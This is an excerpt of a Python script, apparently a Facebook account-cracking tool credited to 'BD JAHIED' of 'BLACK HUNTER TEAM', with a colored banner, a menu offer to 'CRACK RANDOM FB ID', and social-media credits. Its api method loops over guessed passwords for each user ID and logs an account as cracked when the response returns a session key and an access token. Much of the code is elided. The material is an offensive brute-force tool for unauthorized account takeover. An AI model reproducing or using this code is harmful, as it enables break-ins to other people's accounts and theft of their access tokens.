...
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : BD JAHIED 
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFB GROUP : BLACK HUNTER TEAM 
...
\033[1;90m══════════════════════════════════════════════════
    """)
		...
		print("")
		print("\n    \033[0;92m            B.H.T☢️UID☣️CLONING☣️ \033[0;97m ")
		print("%s [%s1%s]%s CRACK RANDOM FB ID 2009-13 {JUST NOW} %s(FREE)"%(G,R,G,Y,B))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [BY] : %s/%s -> \033[0;92m [ txt-OK:%s ]- \033[0;91m[txt-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r  \033[0;91m   [JAHIED-CP] %s | %s\033[0;97m         "%(uid, pw))
...
if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		...
		print("\n [*] Author    : BD JAHIED")
		print(" [*] Team      : BLACK HUNTER TEAM \n")
		print(" [ Sosial Medi  ] \n")
		print(" [*] Facebook  :https://www.facebook.com/ROOT.OFF.JAHIED")
		print(" [*] Instagram :")
